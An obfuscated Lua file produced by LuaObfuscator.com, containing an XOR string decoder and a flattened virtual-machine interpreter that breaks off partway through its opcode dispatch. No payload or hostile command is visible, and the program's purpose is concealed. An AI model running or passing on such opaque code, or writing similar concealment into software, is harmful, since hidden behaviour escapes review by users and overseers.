--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v24, v25)
		local v26 = 0;
		local v27;
		while true do
			if (v26 == 1) then
				return v5(v27);
			end
			if (v26 == 0) then
				v27 = {};
				for v44 = 1, #v24 do
					v6(v27, v0(v4(v1(v2(v24, v44, v44 + 1)), v1(v2(v25, 1 + ((v44 - 1) % #v25), 1 + ((v44 - 1) % #v25) + 1))) % 256));
				end
				v26 = 1;
			end
		end
	end
	local v8 = _G[v7("\62\33\219\17\39\44\208\22", "\74\78\181\100")];
	local v9 = _G[v7("\54\197\72\83\7\204", "\69\177\58\58\105\171\215\133")][v7("\247\240\149\71", "\149\137\225\34")];
	local v10 = _G[v7("\219\38\232\230\62\251", "\168\82\154\143\80\156")][v7("\138\141\179\33", "\233\229\210\83\107\40\46")];
	local v11 = _G[v7("\22\213\80\59\216\2", "\101\161\34\82\182")][v7("\61\253\15", "\78\136\109\57\158\187\130\226")];
	local v12 = _G[v7("\226\42\45\240\255\57", "\145\94\95\153")][v7("\176\238\216\22", "\215\157\173\116\181\46")];
	local v13 = _G[v7("\201\33\166\130\252\221", "\186\85\212\235\146")][v7("\74\199\145", "\56\162\225\118\158\89\142")];
	local v14 = _G[v7("\204\93\7\204\170", "\184\60\101\160\207\66")][v7("\191\62\140\127\189\37", "\220\81\226\28")];
	local v15 = _G[v7("\211\18\215\142\254", "\167\115\181\226\155\138")][v7("\207\236\49\226\78\111", "\166\130\66\135\60\27\17")];
	local v16 = _G[v7("\61\69\94\198", "\80\36\42\174\21")][v7("\118\74\21\47\106", "\26\46\112\87")];
	local v17 = _G[v7("\179\188\55\173\113\177\169", "\212\217\67\203\20\223\223\37")] or function()
		return _ENV;
	end;
	local v18 = _G[v7("\193\191\153\165\215\174\140\188\211\184\129\173", "\178\218\237\200")];
	local v19 = _G[v7("\192\181\180\234\220", "\176\214\213\134")];
	local v20 = _G[v7("\74\241\161\179\215\188", "\57\148\205\214\180\200\54")];
	local v21 = _G[v7("\99\28\237\52\55\125", "\22\114\157\85\84")] or _G[v7("\188\197\201\31\193", "\200\164\171\115\164\61\150")][v7("\150\176\228\2\70\136", "\227\222\148\99\37")];
	local v22 = _G[v7("\237\60\92\71\251\251\54\64", "\153\83\50\50\150")];
	local function v23(v28, v29, ...)
		local v30 = 0;
		local v31;
		local v32;
		local v33;
		local v34;
		local v35;
		local v36;
		local v37;
		local v38;
		local v39;
		local v40;
		local v41;
		local v42;
		local v43;
		while true do
			if (v30 == 1) then
				v35 = nil;
				v36 = nil;
				v37 = nil;
				v38 = nil;
				v30 = 2;
			end
			if (2 == v30) then
				v39 = nil;
				v40 = nil;
				v41 = nil;
				v42 = nil;
				v30 = 3;
			end
			if (v30 == 0) then
				v31 = 0;
				v32 = nil;
				v33 = nil;
				v34 = nil;
				v30 = 1;
			end
			if (v30 == 3) then
				v43 = nil;
				while true do
					local v45 = 0;
					while true do
						if (2 == v45) then
							if (v31 == 3) then
								local v46 = 0;
								while true do
									if (v46 == 0) then
										v37 = nil;
										function v37()
											local v54 = 0;
											local v55;
											local v56;
											local v57;
											local v58;
											local v59;
											while true do
												if (v54 == 2) then
													v59 = nil;
													while true do
														local v111 = 0;
														while true do
															if (v111 == 0) then
																if (v55 == (1202 - (373 + 829))) then
																	local v121 = 0;
																	while true do
																		if (v121 == 0) then
																			v56, v57, v58, v59 = v9(v28, v32, v32 + 3);
																			v32 = v32 + 4;
																			v121 = 1;
																		end
																		if (v121 == 1) then
																			v55 = 1;
																			break;
																		end
																	end
																end
																if (v55 == (732 - (476 + 255))) then
																	return (v59 * 16777216) + (v58 * 65536) + (v57 * (1386 - (369 + 761))) + v56;
																end
																break;
															end
														end
													end
													break;
												end
												if (0 == v54) then
													v55 = 0;
													v56 = nil;
													v54 = 1;
												end
												if (1 == v54) then
													v57 = nil;
													v58 = nil;
													v54 = 2;
												end
											end
										end
										v46 = 1;
									end
									if (v46 == 1) then
										v38 = nil;
										v31 = 4;
										break;
									end
								end
							end
							if (5 == v31) then
								local v47 = 0;
								while true do
									if (v47 == 1) then
										function v41(...)
											return {...}, v20("#", ...);
										end
										v31 = 6;
										break;
									end
									if (v47 == 0) then
										v40 = v37;
										v41 = nil;
										v47 = 1;
									end
								end
							end
							v45 = 3;
						end
						if (v45 == 3) then
							if (7 == v31) then
								local v48 = 0;
								while true do
									if (v48 == 0) then
										function v43(v60, v61, v62)
											local v63 = 0;
											local v64;
											local v65;
											local v66;
											local v67;
											while true do
												if (v63 == 1) then
													v66 = nil;
													v67 = nil;
													v63 = 2;
												end
												if (v63 == 2) then
													while true do
														local v112 = 0;
														while true do
															if (v112 == 0) then
																if (v64 == 0) then
																	local v122 = 0;
																	while true do
																		if (v122 == 0) then
																			v65 = v60[1];
																			v66 = v60[2];
																			v122 = 1;
																		end
																		if (v122 == 1) then
																			v64 = 1;
																			break;
																		end
																	end
																end
																if (1 == v64) then
																	local v123 = 0;
																	while true do
																		if (v123 == 0) then
																			v67 = v60[3];
																			return function(...)
																				local v143 = 0;
																				local v144;
																				local v145;
																				local v146;
																				local v147;
																				local v148;
																				local v149;
																				local v150;
																				local v151;
																				local v152;
																				local v153;
																				local v154;
																				local v155;
																				local v156;
																				local v157;
																				while true do
																					if (v143 == 3) then
																						v155 = (v152 - v146) + 1;
																						v156 = nil;
																						v157 = nil;
																						while true do
																							local v176 = 0;
																							local v177;
																							while true do
																								if (0 == v176) then
																									v177 = 0;
																									while true do
																										if (1 == v177) then
																											if (v157 <= 30) then
																												if (v157 <= 14) then
																													if (v157 <= 6) then
																														if (v157 <= 2) then
																															if (v157 <= 0) then
																																do
																																	return;
																																end
																															elseif (v157 == 1) then
																																v154[v156[2]] = #v154[v156[1068 - (68 + 997)]];
																															else
																																v154[v156[2]] = v154[v156[3]] - v156[4];
																															end
																														elseif (v157 <= 4) then
																															if (v157 == 3) then
																																v154[v156[2]] = v62[v156[3]];
																															else
																																local v213 = 0;
																																local v214;
																																local v215;
																																local v216;
																																local v217;
																																while true do
																																	if (v213 == 1) then
																																		v216 = nil;
																																		v217 = nil;
																																		v213 = 2;
																																	end
																																	if (2 == v213) then
																																		while true do
																																			if (v214 == 1) then
																																				local v364 = 0;
																																				while true do
																																					if (v364 == 0) then
																																						v217 = v154[v215] + v216;
																																						v154[v215] = v217;
																																						v364 = 1;
																																					end
																																					if (1 == v364) then
																																						v214 = 2;
																																						break;
																																					end
																																				end
																																			end
																																			if (v214 == 2) then
																																				if (v216 > 0) then
																																					if (v217 <= v154[v215 + 1]) then
																																						local v462 = 0;
																																						local v463;
																																						while true do
																																							if (v462 == 0) then
																																								v463 = 0;
																																								while true do
																																									if (v463 == 0) then
																																										v148 = v156[3];
																																										v154[v215 + 3] = v217;
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																				elseif (v217 >= v154[v215 + 1]) then
																																					local v464 = 0;
																																					local v465;
																																					while true do
																																						if (v464 == 0) then
																																							v465 = 0;
																																							while true do
																																								if (0 == v465) then
																																									v148 = v156[3];
																																									v154[v215 + 3] = v217;
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end
																																				break;
																																			end
																																			if (v214 == 0) then
																																				local v365 = 0;
																																				while true do
																																					if (v365 == 1) then
																																						v214 = 1;
																																						break;
																																					end
																																					if (v365 == 0) then
																																						v215 = v156[2];
																																						v216 = v154[v215 + 2];
																																						v365 = 1;
																																					end
																																				end
																																			end
																																		end
																																		break;
																																	end
																																	if (v213 == 0) then
																																		v214 = 0;
																																		v215 = nil;
																																		v213 = 1;
																																	end
																																end
																															end
																														elseif (v157 == 5) then
																															v154[v156[2]] = {};
																														else
																															local v219 = 0;
																															local v220;
																															local v221;
																															local v222;
																															local v223;
																															local v224;
																															while true do
																																if (v219 == 1) then
																																	v222 = nil;
																																	v223 = nil;
																																	v219 = 2;
																																end
																																if (v219 == 0) then
																																	v220 = 0;
																																	v221 = nil;
																																	v219 = 1;
																																end
																																if (v219 == 2) then
																																	v224 = nil;
																																	while true do
																																		if (v220 == 1) then
																																			local v366 = 0;
																																			while true do
																																				if (v366 == 0) then
																																					v149 = (v223 + v221) - 1;
																																					v224 = 0;
																																					v366 = 1;
																																				end
																																				if (v366 == 1) then
																																					v220 = 2;
																																					break;
																																				end
																																			end
																																		end
																																		if (v220 == 0) then
																																			local v367 = 0;
																																			while true do
																																				if (v367 == 1) then
																																					v220 = 1;
																																					break;
																																				end
																																				if (v367 == 0) then
																																					v221 = v156[2];
																																					v222, v223 = v147(v154[v221](v21(v154, v221 + 1, v149)));
																																					v367 = 1;
																																				end
																																			end
																																		end
																																		if (2 == v220) then
																																			for v412 = v221, v149 do
																																				local v413 = 0;
																																				local v414;
																																				while true do
																																					if (v413 == 0) then
																																						v414 = 0;
																																						while true do
																																							if (v414 == 0) then
																																								v224 = v224 + 1;
																																								v154[v412] = v222[v224];
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																													elseif (v157 <= 10) then
																														if (v157 <= 8) then
																															if (v157 > 7) then
																																local v225 = 0;
																																local v226;
																																local v227;
																																local v228;
																																local v229;
																																local v230;
																																while true do
																																	if (v225 == 2) then
																																		v230 = nil;
																																		while true do
																																			if (0 == v226) then
																																				local v368 = 0;
																																				while true do
																																					if (1 == v368) then
																																						v226 = 1;
																																						break;
																																					end
																																					if (v368 == 0) then
																																						v227 = v156[1272 - (226 + 1044)];
																																						v228, v229 = v147(v154[v227](v21(v154, v227 + 1, v156[3])));
																																						v368 = 1;
																																					end
																																				end
																																			end
																																			if (2 == v226) then
																																				for v415 = v227, v149 do
																																					local v416 = 0;
																																					local v417;
																																					while true do
																																						if (v416 == 0) then
																																							v417 = 0;
																																							while true do
																																								if (v417 == 0) then
																																									v230 = v230 + (4 - 3);
																																									v154[v415] = v228[v230];
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end
																																				break;
																																			end
																																			if (v226 == 1) then
																																				local v369 = 0;
																																				while true do
																																					if (1 == v369) then
																																						v226 = 2;
																																						break;
																																					end
																																					if (v369 == 0) then
																																						v149 = (v229 + v227) - 1;
																																						v230 = 0;
																																						v369 = 1;
																																					end
																																				end
																																			end
																																		end
																																		break;
																																	end
																																	if (v225 == 1) then
																																		v228 = nil;
																																		v229 = nil;
																																		v225 = 2;
																																	end
																																	if (v225 == 0) then
																																		v226 = 0;
																																		v227 = nil;
																																		v225 = 1;
																																	end
																																end
																															else
																																local v231 = 0;
																																local v232;
																																local v233;
																																while true do
																																	if (v231 == 1) then
																																		while true do
																																			if (v232 == 0) then
																																				v233 = v156[2];
																																				v154[v233] = v154[v233](v21(v154, v233 + 1, v156[120 - (32 + 85)]));
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																	if (v231 == 0) then
																																		v232 = 0;
																																		v233 = nil;
																																		v231 = 1;
																																	end
																																end
																															end
																														elseif (v157 == 9) then
																															v154[v156[2]] = v154[v156[3]] % v154[v156[4]];
																														else
																															v154[v156[2]] = v154[v156[3 + 0]];
																														end
																													elseif (v157 <= (3 + 9)) then
																														if (v157 > 11) then
																															v154[v156[2]] = v154[v156[3]] % v156[4];
																														else
																															local v238 = 0;
																															local v239;
																															local v240;
																															local v241;
																															local v242;
																															while true do
																																if (1 == v238) then
																																	v241 = nil;
																																	v242 = nil;
																																	v238 = 2;
																																end
																																if (v238 == 2) then
																																	while true do
																																		if (v239 == 2) then
																																			for v418 = 1, v156[4] do
																																				local v419 = 0;
																																				local v420;
																																				local v421;
																																				while true do
																																					if (v419 == 0) then
																																						v420 = 0;
																																						v421 = nil;
																																						v419 = 1;
																																					end
																																					if (v419 == 1) then
																																						while true do
																																							if (0 == v420) then
																																								local v504 = 0;
																																								while true do
																																									if (v504 == 1) then
																																										v420 = 1;
																																										break;
																																									end
																																									if (v504 == 0) then
																																										v148 = v148 + (2 - 1);
																																										v421 = v144[v148];
																																										v504 = 1;
																																									end
																																								end
																																							end
																																							if (v420 == 1) then
																																								if (v421[1] == 16) then
																																									v242[v418 - 1] = {v154,v421[3]};
																																								else
																																									v242[v418 - 1] = {v61,v421[3]};
																																								end
																																								v153[#v153 + 1] = v242;
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																			v154[v156[2]] = v43(v240, v241, v62);
																																			break;
																																		end
																																		if (v239 == 0) then
																																			local v373 = 0;
																																			while true do
																																				if (v373 == 0) then
																																					v240 = v145[v156[3]];
																																					v241 = nil;
																																					v373 = 1;
																																				end
																																				if (v373 == 1) then
																																					v239 = 1;
																																					break;
																																				end
																																			end
																																		end
																																		if (v239 == 1) then
																																			local v374 = 0;
																																			while true do
																																				if (v374 == 0) then
																																					v242 = {};
																																					v241 = v18({}, {[v7("\134\254\27\3\241\7\104", "\217\161\114\109\149\98\16")]=function(v466, v467)
																																						local v468 = 0;
																																						local v469;
																																						local v470;
																																						while true do
																																							if (0 == v468) then
																																								v469 = 0;
																																								v470 = nil;
																																								v468 = 1;
																																							end
																																							if (v468 == 1) then
																																								while true do
																																									if (v469 == 0) then
																																										local v525 = 0;
																																										while true do
																																											if (v525 == 0) then
																																												v470 = v242[v467];
																																												return v470[1][v470[959 - (892 + 65)]];
																																											end
																																										end
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end,[v7("\75\45\46\61\107\181\122\22\37\32", "\20\114\64\88\28\220")]=function(v471, v472, v473)
																																						local v474 = 0;
																																						local v475;
																																						local v476;
																																						while true do
																																							if (v474 == 1) then
																																								while true do
																																									if (v475 == 0) then
																																										v476 = v242[v472];
																																										v476[1][v476[2]] = v473;
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																							if (v474 == 0) then
																																								v475 = 0;
																																								v476 = nil;
																																								v474 = 1;
																																							end
																																						end
																																					end});
																																					v374 = 1;
																																				end
																																				if (v374 == 1) then
																																					v239 = 2;
																																					break;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (0 == v238) then
																																	v239 = 0;
																																	v240 = nil;
																																	v238 = 1;
																																end
																															end
																														end
																													elseif (v157 > 13) then
																														local v243 = 0;
																														local v244;
																														local v245;
																														while true do
																															if (v243 == 1) then
																																while true do
																																	if (v244 == 0) then
																																		v245 = v156[2];
																																		do
																																			return v21(v154, v245, v149);
																																		end
																																		break;
																																	end
																																end
																																break;
																															end
																															if (v243 == 0) then
																																v244 = 0;
																																v245 = nil;
																																v243 = 1;
																															end
																														end
																													else
																														local v246 = 0;
																														local v247;
																														local v248;
																														while true do
																															if (1 == v246) then
																																while true do
																																	if (v247 == 0) then
																																		v248 = v156[2];
																																		v154[v248] = v154[v248](v21(v154, v248 + 1, v149));
																																		break;
																																	end
																																end
																																break;
																															end
																															if (v246 == 0) then
																																v247 = 0;
																																v248 = nil;
																																v246 = 1;
																															end
																														end
																													end
																												elseif (v157 <= 22) then
																													if (v157 <= (32 - 14)) then
																														if (v157 <= (366 - (87 + 263))) then
																															if (v157 > 15) then
																																v154[v156[2]] = v154[v156[3]];
																															else
																																v154[v156[2]] = v154[v156[3]] % v156[184 - (67 + 113)];
																															end
																														elseif (v157 == (13 + 4)) then
																															v154[v156[2]] = v156[7 - 4] ~= 0;
																														else
																															local v253 = 0;
																															local v254;
																															local v255;
																															local v256;
																															while true do
																																if (v253 == 1) then
																																	v256 = nil;
																																	while true do
																																		if (v254 == 0) then
																																			local v378 = 0;
																																			while true do
																																				if (v378 == 0) then
																																					v255 = v156[2];
																																					v256 = v154[v156[3]];
																																					v378 = 1;
																																				end
																																				if (v378 == 1) then
																																					v254 = 1;
																																					break;
																																				end
																																			end
																																		end
																																		if (v254 == 1) then
																																			v154[v255 + 1] = v256;
																																			v154[v255] = v256[v156[4]];
																																			break;
																																		end
																																	end
																																	break;
																																end
																																if (v253 == 0) then
																																	v254 = 0;
																																	v255 = nil;
																																	v253 = 1;
																																end
																															end
																														end
																													elseif (v157 <= 20) then
																														if (v157 == 19) then
																															local v257 = 0;
																															local v258;
																															local v259;
																															local v260;
																															local v261;
																															local v262;
																															while true do
																																if (1 == v257) then
																																	v260 = nil;
																																	v261 = nil;
																																	v257 = 2;
																																end
																																if (v257 == 2) then
																																	v262 = nil;
																																	while true do
																																		if (v258 == 1) then
																																			local v382 = 0;
																																			while true do
																																				if (v382 == 1) then
																																					v258 = 2;
																																					break;
																																				end
																																				if (v382 == 0) then
																																					v149 = (v261 + v259) - 1;
																																					v262 = 0;
																																					v382 = 1;
																																				end
																																			end
																																		end
																																		if (v258 == 2) then
																																			for v422 = v259, v149 do
																																				local v423 = 0;
																																				local v424;
																																				while true do
																																					if (v423 == 0) then
																																						v424 = 0;
																																						while true do
																																							if (v424 == 0) then
																																								v262 = v262 + 1;
																																								v154[v422] = v260[v262];
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																			break;
																																		end
																																		if (v258 == 0) then
																																			local v383 = 0;
																																			while true do
																																				if (v383 == 1) then
																																					v258 = 1;
																																					break;
																																				end
																																				if (v383 == 0) then
																																					v259 = v156[2 + 0];
																																					v260, v261 = v147(v154[v259](v21(v154, v259 + 1, v149)));
																																					v383 = 1;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v257 == 0) then
																																	v258 = 0;
																																	v259 = nil;
																																	v257 = 1;
																																end
																															end
																														else
																															v154[v156[2]]();
																														end
																													elseif (v157 == 21) then
																														local v263 = 0;
																														local v264;
																														local v265;
																														while true do
																															if (v263 == 1) then
																																while true do
																																	if (v264 == 0) then
																																		v265 = v156[2];
																																		do
																																			return v21(v154, v265, v149);
																																		end
																																		break;
																																	end
																																end
																																break;
																															end
																															if (v263 == 0) then
																																v264 = 0;
																																v265 = nil;
																																v263 = 1;
																															end
																														end
																													else
																														local v266 = 0;
																														local v267;
																														local v268;
																														while true do
																															if (v266 == 0) then
																																v267 = 0;
																																v268 = nil;
																																v266 = 1;
																															end
																															if (v266 == 1) then
																																while true do
																																	if (v267 == 0) then
																																		v268 = v156[2];
																																		v154[v268] = v154[v268](v21(v154, v268 + (3 - 2), v156[3]));
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													end
																												elseif (v157 <= 26) then
																													if (v157 <= 24) then
																														if (v157 == 23) then
																															v154[v156[2]] = v154[v156[3]] % v154[v156[4]];
																														else
																															v154[v156[2]] = #v154[v156[3]];
																														end
																													elseif (v157 > 25) then
																														v154[v156[2]] = v61[v156[955 - (802 + 150)]];
																													else
																														v148 = v156[3];
																													end
																												elseif (v157 <= (75 - 47)) then
																													if (v157 == 27) then
																														local v274 = 0;
																														local v275;
																														local v276;
																														local v277;
																														local v278;
																														while true do
																															if (v274 == 0) then
																																v275 = 0;
																																v276 = nil;
																																v274 = 1;
																															end
																															if (v274 == 2) then
																																while true do
																																	if (v275 == 2) then
																																		if (v277 > 0) then
																																			if (v278 <= v154[v276 + 1]) then
																																				local v477 = 0;
																																				local v478;
																																				while true do
																																					if (0 == v477) then
																																						v478 = 0;
																																						while true do
																																							if (0 == v478) then
																																								v148 = v156[3];
																																								v154[v276 + 3] = v278;
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																		elseif (v278 >= v154[v276 + 1]) then
																																			local v479 = 0;
																																			local v480;
																																			while true do
																																				if (v479 == 0) then
																																					v480 = 0;
																																					while true do
																																						if (v480 == 0) then
																																							v148 = v156[3];
																																							v154[v276 + 3] = v278;
																																							break;
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																		break;
																																	end
																																	if (v275 == 1) then
																																		local v387 = 0;
																																		while true do
																																			if (v387 == 1) then
																																				v275 = 2;
																																				break;
																																			end
																																			if (v387 == 0) then
																																				v278 = v154[v276] + v277;
																																				v154[v276] = v278;
																																				v387 = 1;
																																			end
																																		end
																																	end
																																	if (v275 == 0) then
																																		local v388 = 0;
																																		while true do
																																			if (v388 == 0) then
																																				v276 = v156[3 - 1];
																																				v277 = v154[v276 + 2];
																																				v388 = 1;
																																			end
																																			if (v388 == 1) then
																																				v275 = 1;
																																				break;
																																			end
																																		end
																																	end
																																end
																																break;
																															end
																															if (v274 == 1) then
																																v277 = nil;
																																v278 = nil;
																																v274 = 2;
																															end
																														end
																													else
																														v154[v156[2]][v154[v156[3]]] = v154[v156[3 + 1]];
																													end
																												elseif (v157 > 29) then
																													local v281 = 0;
																													local v282;
																													local v283;
																													local v284;
																													local v285;
																													local v286;
																													while true do
																														if (v281 == 1) then
																															v284 = nil;
																															v285 = nil;
																															v281 = 2;
																														end
																														if (v281 == 0) then
																															v282 = 0;
																															v283 = nil;
																															v281 = 1;
																														end
																														if (2 == v281) then
																															v286 = nil;
																															while true do
																																if (1 == v282) then
																																	local v389 = 0;
																																	while true do
																																		if (v389 == 0) then
																																			v149 = (v285 + v283) - 1;
																																			v286 = 0;
																																			v389 = 1;
																																		end
																																		if (v389 == 1) then
																																			v282 = 2;
																																			break;
																																		end
																																	end
																																end
																																if (v282 == 2) then
																																	for v425 = v283, v149 do
																																		local v426 = 0;
																																		local v427;
																																		while true do
																																			if (0 == v426) then
																																				v427 = 0;
																																				while true do
																																					if (0 == v427) then
																																						v286 = v286 + 1;
																																						v154[v425] = v284[v286];
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v282 == 0) then
																																	local v390 = 0;
																																	while true do
																																		if (v390 == 0) then
																																			v283 = v156[999 - (915 + 82)];
																																			v284, v285 = v147(v154[v283](v154[v283 + 1]));
																																			v390 = 1;
																																		end
																																		if (1 == v390) then
																																			v282 = 1;
																																			break;
																																		end
																																	end
																																end
																															end
																															break;
																														end
																													end
																												else
																													local v287 = 0;
																													local v288;
																													local v289;
																													while true do
																														if (v287 == 1) then
																															while true do
																																if (0 == v288) then
																																	v289 = v156[2];
																																	v154[v289] = v154[v289](v21(v154, v289 + 1, v149));
																																	break;
																																end
																															end
																															break;
																														end
																														if (0 == v287) then
																															v288 = 0;
																															v289 = nil;
																															v287 = 1;
																														end
																													end
																												end
																											elseif (v157 <= (127 - 82)) then
																												if (v157 <= 37) then
																													if (v157 <= 33) then
																														if (v157 <= 31) then
																															v154[v156[2]][v154[v156[2 + 1]]] = v156[4];
																														elseif (v157 == 32) then
																															v154[v156[2]][v154[v156[3 - 0]]] = v154[v156[4]];
																														else
																															local v292 = 0;
																															local v293;
																															local v294;
																															local v295;
																															local v296;
																															local v297;
																															while true do
																																if (v292 == 2) then
																																	v297 = nil;
																																	while true do
																																		if (v293 == 0) then
																																			local v393 = 0;
																																			while true do
																																				if (v393 == 1) then
																																					v293 = 1;
																																					break;
																																				end
																																				if (v393 == 0) then
																																					v294 = v156[1189 - (1069 + 118)];
																																					v295, v296 = v147(v154[v294](v154[v294 + 1]));
																																					v393 = 1;
																																				end
																																			end
																																		end
																																		if (2 == v293) then
																																			for v428 = v294, v149 do
																																				local v429 = 0;
																																				local v430;
																																				while true do
																																					if (v429 == 0) then
																																						v430 = 0;
																																						while true do
																																							if (0 == v430) then
																																								v297 = v297 + (2 - 1);
																																								v154[v428] = v295[v297];
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																			break;
																																		end
																																		if (v293 == 1) then
																																			local v394 = 0;
																																			while true do
																																				if (0 == v394) then
																																					v149 = (v296 + v294) - 1;
																																					v297 = 0;
																																					v394 = 1;
																																				end
																																				if (1 == v394) then
																																					v293 = 2;
																																					break;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v292 == 1) then
																																	v295 = nil;
																																	v296 = nil;
																																	v292 = 2;
																																end
																																if (v292 == 0) then
																																	v293 = 0;
																																	v294 = nil;
																																	v292 = 1;
																																end
																															end
																														end
																													elseif (v157 <= (76 - 41)) then
																														if (v157 > 34) then
																															v154[v156[2]][v154[v156[3]]] = v156[4];
																														else
																															local v300 = 0;
																															local v301;
																															local v302;
																															local v303;
																															local v304;
																															while true do
																																if (v300 == 1) then
																																	v303 = nil;
																																	v304 = nil;
																																	v300 = 2;
																																end
																																if (v300 == 2) then
																																	while true do
																																		if (v301 == 1) then
																																			v304 = v154[v302 + 2];
																																			if (v304 > 0) then
																																				if (v303 > v154[v302 + 1]) then
																																					v148 = v156[3];
																																				else
																																					v154[v302 + 3] = v303;
																																				end
																																			elseif (v303 < v154[v302 + 1 + 0]) then
																																				v148 = v156[3];
																																			else
																																				v154[v302 + 3] = v303;
																																			end
																																			break;
																																		end
																																		if (v301 == 0) then
																																			local v396 = 0;
																																			while true do
																																				if (v396 == 0) then
																																					v302 = v156[2];
																																					v303 = v154[v302];
																																					v396 = 1;
																																				end
																																				if (1 == v396) then
																																					v301 = 1;
																																					break;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v300 == 0) then
																																	v301 = 0;
																																	v302 = nil;
																																	v300 = 1;
																																end
																															end
																														end
																													elseif (v157 > 36) then
																														local v305 = 0;
																														local v306;
																														local v307;
																														local v308;
																														local v309;
																														while true do
																															if (v305 == 0) then
																																v306 = 0;
																																v307 = nil;
																																v305 = 1;
																															end
																															if (v305 == 1) then
																																v308 = nil;
																																v309 = nil;
																																v305 = 2;
																															end
																															if (v305 == 2) then
																																while true do
																																	if (v306 == 0) then
																																		local v397 = 0;
																																		while true do
																																			if (v397 == 0) then
																																				v307 = v156[2];
																																				v308 = v154[v307];
																																				v397 = 1;
																																			end
																																			if (v397 == 1) then
																																				v306 = 1;
																																				break;
																																			end
																																		end
																																	end
																																	if (v306 == 1) then
																																		v309 = v154[v307 + 2];
																																		if (v309 > 0) then
																																			if (v308 > v154[v307 + 1]) then
																																				v148 = v156[3];
																																			else
																																				v154[v307 + 3] = v308;
																																			end
																																		elseif (v308 < v154[v307 + 1]) then
																																			v148 = v156[4 - 1];
																																		else
																																			v154[v307 + 3 + 0] = v308;
																																		end
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													else
																														v154[v156[2]] = v154[v156[3]] + v156[795 - (368 + 423)];
																													end
																												elseif (v157 <= 41) then
																													if (v157 <= 39) then
																														if (v157 > 38) then
																															v154[v156[2]] = v156[3] + v154[v156[4]];
																														else
																															local v312 = 0;
																															local v313;
																															local v314;
																															local v315;
																															while true do
																																if (v312 == 0) then
																																	v313 = 0;
																																	v314 = nil;
																																	v312 = 1;
																																end
																																if (v312 == 1) then
																																	v315 = nil;
																																	while true do
																																		if (v313 == 0) then
																																			local v399 = 0;
																																			while true do
																																				if (v399 == 1) then
																																					v313 = 1;
																																					break;
																																				end
																																				if (v399 == 0) then
																																					v314 = v156[2];
																																					v315 = v154[v156[3]];
																																					v399 = 1;
																																				end
																																			end
																																		end
																																		if (v313 == 1) then
																																			v154[v314 + (3 - 2)] = v315;
																																			v154[v314] = v315[v156[4]];
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																													elseif (v157 > (58 - (10 + 8))) then
																														do
																															return;
																														end
																													else
																														v154[v156[2]]();
																													end
																												elseif (v157 <= 43) then
																													if (v157 > 42) then
																														local v316 = 0;
																														local v317;
																														local v318;
																														while true do
																															if (0 == v316) then
																																v317 = 0;
																																v318 = nil;
																																v316 = 1;
																															end
																															if (v316 == 1) then
																																while true do
																																	if (v317 == 0) then
																																		v318 = v156[2];
																																		v154[v318](v21(v154, v318 + 1, v149));
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													else
																														v154[v156[2]] = v62[v156[3]];
																													end
																												elseif (v157 == 44) then
																													v154[v156[7 - 5]] = v154[v156[445 - (416 + 26)]] + v156[4];
																												elseif not v154[v156[2]] then
																													v148 = v148 + 1;
																												else
																													v148 = v156[3];
																												end
																											elseif (v157 <= 53) then
																												if (v157 <= 49) then
																													if (v157 <= 47) then
																														if (v157 > 46) then
																															v154[v156[2]] = v156[3];
																														else
																															v154[v156[2]] = v156[3] ~= 0;
																														end
																													elseif (v157 == 48) then
																														local v325 = 0;
																														local v326;
																														local v327;
																														while true do
																															if (v325 == 1) then
																																while true do
																																	if (v326 == 0) then
																																		v327 = v156[2];
																																		v154[v327](v21(v154, v327 + 1, v149));
																																		break;
																																	end
																																end
																																break;
																															end
																															if (v325 == 0) then
																																v326 = 0;
																																v327 = nil;
																																v325 = 1;
																															end
																														end
																													else
																														local v328 = 0;
																														local v329;
																														local v330;
																														while true do
																															if (v328 == 0) then
																																v329 = 0;
																																v330 = nil;
																																v328 = 1;
																															end
																															if (v328 == 1) then
																																while true do
																																	if (v329 == 0) then
																																		v330 = v156[6 - 4];
																																		do
																																			return v154[v330](v21(v154, v330 + 1 + 0, v156[3]));
																																		end
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													end
																												elseif (v157 <= 51) then
																													if (v157 > 50) then
																														v154[v156[2]] = v61[v156[3]];
																													else
																														v148 = v156[3];
																													end
																												elseif (v157 > 52) then
																													v154[v156[2]] = v154[v156[3]] - v156[4];
																												else
																													v154[v156[3 - 1]] = v156[3] + v154[v156[442 - (145 + 293)]];
																												end
																											elseif (v157 <= 57) then
																												if (v157 <= 55) then
																													if (v157 > 54) then
